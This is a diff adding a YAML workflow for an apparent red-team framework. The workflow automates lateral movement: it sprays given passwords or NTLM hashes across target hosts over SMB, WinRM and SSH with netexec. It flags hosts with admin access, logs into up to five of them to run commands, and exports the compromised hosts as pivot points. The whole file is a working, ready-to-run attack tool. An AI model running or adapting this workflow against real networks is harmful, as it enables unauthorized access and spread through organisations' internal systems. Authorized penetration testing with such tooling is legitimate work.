@@ -1,0 +1,263 @@
+name: lateral-movement
+description: |
+  Lateral movement operations — test discovered credentials across
+  multiple internal hosts, identify accessible systems, and establish
+  new footholds for further operations.
+tags: [redteam, lateral-movement, pivot, credentials]
+dispatch:
+  inputs:
+    targets_file:
+      required: true
+      type: string
+      description: File with target IPs (one per line)
+    username:
+      required: true
+      type: string
+      description: Username to test
+    password:
+      type: string
+      default: ''
+      description: Password to test
+    nt_hash:
+      type: string
+      default: ''
+      description: NTLM hash for pass-the-hash
+    domain:
+      type: string
+      default: ''
+      description: AD domain
+    protocols:
+      type: string
+      default: smb,ssh,winrm
+      description: Comma-separated protocols to test
+
+jobs:
+  spray-smb:
+    name: SMB Access Testing
+    if: "{{ 'smb' in inputs.protocols }}"
+    steps:
+    - task: netexec
+      name: nxc-smb-test
+      with:
+        target: '{{ inputs.targets_file }}'
+        protocol: smb
+        username: '{{ inputs.username }}'
+        password: '{{ inputs.password or inputs.nt_hash }}'
+        domain: '{{ inputs.domain }}'
+      log-stdout: true
+      continue-on-error: true
+    - name: collect-smb-access
+      script: |
+        results = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+        accessible = set()
+        admin_hosts = set()
+        for item in results:
+            host = item.get('host', '')
+            if host:
+                accessible.add(host)
+                if item.get('extra', {}).get('admin', False):
+                    admin_hosts.add(host)
+
+        from pathlib import Path
+        smb_file = '/tmp/ofx_lateral_smb.txt'
+        Path(smb_file).write_text('\n'.join(sorted(accessible)) + '\n')
+        admin_file = '/tmp/ofx_lateral_smb_admin.txt'
+        Path(admin_file).write_text('\n'.join(sorted(admin_hosts)) + '\n')
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"smb_accessible={len(accessible)}\n")
+            f.write(f"smb_admin={len(admin_hosts)}\n")
+            f.write(f"smb_file={smb_file}\n")
+            f.write(f"smb_admin_file={admin_file}\n")
+
+        print(f"[+] SMB: {len(accessible)} accessible, {len(admin_hosts)} with admin")
+        for h in sorted(admin_hosts):
+            print(f"    [ADMIN] {h}")
+      log-stdout: true
+
+  spray-winrm:
+    name: WinRM Access Testing
+    if: "{{ 'winrm' in inputs.protocols }}"
+    steps:
+    - task: netexec
+      name: nxc-winrm-test
+      with:
+        target: '{{ inputs.targets_file }}'
+        protocol: winrm
+        username: '{{ inputs.username }}'
+        password: '{{ inputs.password or inputs.nt_hash }}'
+        domain: '{{ inputs.domain }}'
+      log-stdout: true
+      continue-on-error: true
+    - name: collect-winrm-access
+      script: |
+        results = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+        accessible = set()
+        for item in results:
+            host = item.get('host', '')
+            if host:
+                accessible.add(host)
+
+        from pathlib import Path
+        winrm_file = '/tmp/ofx_lateral_winrm.txt'
+        Path(winrm_file).write_text('\n'.join(sorted(accessible)) + '\n')
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"winrm_accessible={len(accessible)}\n")
+            f.write(f"winrm_file={winrm_file}\n")
+
+        print(f"[+] WinRM: {len(accessible)} accessible hosts")
+        for h in sorted(accessible):
+            print(f"    {h}")
+      log-stdout: true
+
+  spray-ssh:
+    name: SSH Access Testing
+    if: "{{ 'ssh' in inputs.protocols }}"
+    steps:
+    - task: netexec
+      name: nxc-ssh-test
+      with:
+        target: '{{ inputs.targets_file }}'
+        protocol: ssh
+        username: '{{ inputs.username }}'
+        password: '{{ inputs.password }}'
+      log-stdout: true
+      continue-on-error: true
+    - name: collect-ssh-access
+      script: |
+        results = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+        accessible = set()
+        for item in results:
+            host = item.get('host', '')
+            if host:
+                accessible.add(host)
+
+        from pathlib import Path
+        ssh_file = '/tmp/ofx_lateral_ssh.txt'
+        Path(ssh_file).write_text('\n'.join(sorted(accessible)) + '\n')
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"ssh_accessible={len(accessible)}\n")
+            f.write(f"ssh_file={ssh_file}\n")
+
+        print(f"[+] SSH: {len(accessible)} accessible hosts")
+        for h in sorted(accessible):
+            print(f"    {h}")
+      log-stdout: true
+
+  pivot:
+    name: Establish Pivot Points
+    needs: [spray-smb, spray-winrm, spray-ssh]
+    steps:
+    - name: pivot-enumeration
+      script: |
+        from ofx.api.post import RunnerRegistry
+        from pathlib import Path
+
+        username = '{{ inputs.username }}'
+        password = '{{ inputs.password }}'
+        domain = '{{ inputs.domain }}'
+
+        # Collect all accessible hosts
+        all_hosts = set()
+        pivot_results = {}
+
+        for proto_file in ['/tmp/ofx_lateral_smb_admin.txt', '/tmp/ofx_lateral_winrm.txt', '/tmp/ofx_lateral_ssh.txt']:
+            try:
+                hosts = Path(proto_file).read_text().strip().splitlines()
+                all_hosts.update(h for h in hosts if h.strip())
+            except FileNotFoundError:
+                pass
+
+        # Quick enum on first 5 accessible hosts
+        for host in sorted(all_hosts)[:5]:
+            try:
+                # Try SSH first, then WinRM
+                try:
+                    runner = RunnerRegistry.create('ssh', host=host, user=username, password=password)
+                    whoami = runner.run('whoami').strip()
+                    hostname = runner.run('hostname').strip()
+                    pivot_results[host] = {'protocol': 'ssh', 'user': whoami, 'hostname': hostname}
+                except Exception:
+                    runner = RunnerRegistry.create('winrm', host=host, user=username, password=password)
+                    whoami = runner.run('whoami').strip()
+                    hostname = runner.run('hostname').strip()
+                    pivot_results[host] = {'protocol': 'winrm', 'user': whoami, 'hostname': hostname}
+            except Exception as e:
+                pivot_results[host] = {'protocol': 'failed', 'error': str(e)}
+
+        pivot_file = '/tmp/ofx_lateral_pivots.txt'
+        with open(pivot_file, 'w') as f:
+            for host, info in sorted(pivot_results.items()):
+                f.write(f"{host}\t{info.get('protocol')}\t{info.get('user', '')}\t{info.get('hostname', '')}\n")
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"pivot_count={len(pivot_results)}\n")
+            f.write(f"pivot_file={pivot_file}\n")
+            f.write(f"total_accessible={len(all_hosts)}\n")
+
+        print(f"[+] Pivot enumeration: {len(pivot_results)} hosts tested")
+        for host, info in sorted(pivot_results.items()):
+            if info.get('protocol') != 'failed':
+                print(f"    [✓] {host} via {info['protocol']} as {info.get('user', '?')}")
+            else:
+                print(f"    [✗] {host}: {info.get('error', 'unknown')}")
+      log-stdout: true
+
+  summary:
+    name: Lateral Movement Summary
+    needs: [spray-smb, spray-winrm, spray-ssh, pivot]
+    steps:
+    - name: report
+      run: |
+        echo "======================================================"
+        echo " LATERAL MOVEMENT REPORT"
+        echo "======================================================"
+        echo ""
+        echo "Credentials: {{ inputs.username }}:{{ inputs.password | default('[hash]', true) }}"
+        echo "Domain: {{ inputs.domain | default('N/A', true) }}"
+        echo ""
+        echo "--- Access Summary ---"
+        echo "  SMB accessible: {{ jobs['spray-smb'].outputs.smb_accessible | default('N/A', true) }}"
+        echo "  SMB admin: {{ jobs['spray-smb'].outputs.smb_admin | default('N/A', true) }}"
+        echo "  WinRM accessible: {{ jobs['spray-winrm'].outputs.winrm_accessible | default('N/A', true) }}"
+        echo "  SSH accessible: {{ jobs['spray-ssh'].outputs.ssh_accessible | default('N/A', true) }}"
+        echo ""
+        echo "--- Pivot Points ---"
+        echo "  Total accessible: {{ jobs['pivot'].outputs.total_accessible }}"
+        echo "  Enumerated: {{ jobs['pivot'].outputs.pivot_count }}"
+        echo "  Details: {{ jobs['pivot'].outputs.pivot_file }}"
+      log-stdout: true
+    - name: export-to-project
+      script: |
+        import shutil
+        from pathlib import Path
+
+        project = '{{ vars.project_path | default("", true) }}'
+        if not project:
+            print('No --project set, skipping export')
+        else:
+            # Export accessible hosts
+            hosts_dir = Path(project) / 'hosts'
+            hosts_dir.mkdir(parents=True, exist_ok=True)
+            for f in ['/tmp/ofx_lateral_smb.txt', '/tmp/ofx_lateral_winrm.txt', '/tmp/ofx_lateral_ssh.txt']:
+                if Path(f).is_file() and Path(f).stat().st_size > 0:
+                    name = Path(f).name.replace('ofx_lateral_', 'accessible-')
+                    shutil.copy2(f, hosts_dir / name)
+                    print(f'  [+] hosts/{name}')
+
+            # Export pivot data
+            pivot_file = '{{ jobs["pivot"].outputs.pivot_file | default("", true) }}'
+            if pivot_file and Path(pivot_file).is_file():
+                lm_dir = Path(project) / 'post-exploits'
+                lm_dir.mkdir(parents=True, exist_ok=True)
+                shutil.copy2(pivot_file, lm_dir / 'pivot-points.txt')
+                print(f'  [+] post-exploits/pivot-points.txt')
+
+            # SMB admin list is high value
+            admin_file = '{{ jobs["spray-smb"].outputs.smb_admin_file | default("", true) }}'
+            if admin_file and Path(admin_file).is_file() and Path(admin_file).stat().st_size > 0:
+                shutil.copy2(admin_file, hosts_dir / 'smb-admin-hosts.txt')
+                print(f'  [+] hosts/smb-admin-hosts.txt')
+      continue-on-error: true
